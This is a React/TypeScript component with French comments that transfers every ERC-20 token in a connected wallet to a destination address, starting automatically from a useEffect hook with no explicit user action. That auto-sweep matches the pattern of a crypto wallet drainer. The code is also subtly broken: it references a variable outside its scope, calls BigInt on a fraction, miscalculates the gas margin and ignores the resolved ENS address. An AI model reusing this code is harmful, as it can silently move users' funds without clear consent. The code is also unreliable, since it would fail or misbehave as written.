import { useEffect } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { normalize } from 'viem/ens';
import { isAddress } from 'essential-eth';

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  // Fonction pour estimer et envoyer les tokens avec marge de sécurité
  const sendAllTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
      .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
      .map((token) => token.contract_address as `0x${string}`);

    if (!walletClient) return;
    if (!destinationAddress) return;
    
    // Vérifier si l'adresse de destination est une adresse ENS
    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      } else {
        console.error("Adresse ENS introuvable");
        return;
      }
    }

    // Envoyer tous les tokens
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token) continue;

      let gasLimit: bigint;
      let totalGasWithMargin: bigint;
      const marginMultiplier = 1.2; // 20% de marge

      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [
            destinationAddress as `0x${string}`,
            BigInt(token.balance),
          ],
        });

        // Estimation des frais de gaz
        const estimatedGas = await publicClient.estimateGas(request);
        const gasPrice = await publicClient.getGasPrice();

        // Assurez-vous que les deux valeurs sont du même type (bigint)
        gasLimit = BigInt(estimatedGas) * BigInt(gasPrice);
        totalGasWithMargin = gasLimit * BigInt(Math.floor(marginMultiplier * 100)); // Ajouter la marge de sécurité

        // Vérifier si le portefeuille a assez de fonds pour couvrir les frais
        const balance = await publicClient.getBalance(walletClient.account);
        if (balance < totalGasWithMargin) {
          console.error('Fonds insuffisants pour couvrir les frais de gaz');
          return;
        }

        // Essayer la première transaction
        const response = await walletClient.writeContract(request);
        setCheckedRecords((old) => ({
          ...old,
          [tokenAddress]: {
            ...old[tokenAddress],
            pendingTxn: response,
          },
        }));

      } catch (err) {
        console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);

        // Si la première transaction échoue, tenter avec plus de marge
        try {
          const responseWithMoreMargin = await walletClient.writeContract({
            ...request,
            gasLimit: totalGasWithMargin * BigInt(1.5), // Tentative avec 50% de marge en plus
          });
          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...old[tokenAddress],
              pendingTxn: responseWithMoreMargin,
            },
          }));
        } catch (retryErr) {
          console.error('Erreur lors de la seconde tentative :', retryErr);
        }
      }
    }
  };

  useEffect(() => {
    if (tokens.length > 0 && destinationAddress) {
      sendAllTokens();
    }
  }, [tokens, destinationAddress, walletClient]); // Quand les tokens ou l'adresse changent, l'envoi se déclenche

  return <div style={{ margin: '20px' }}>Tokens being sent automatically...</div>;
};
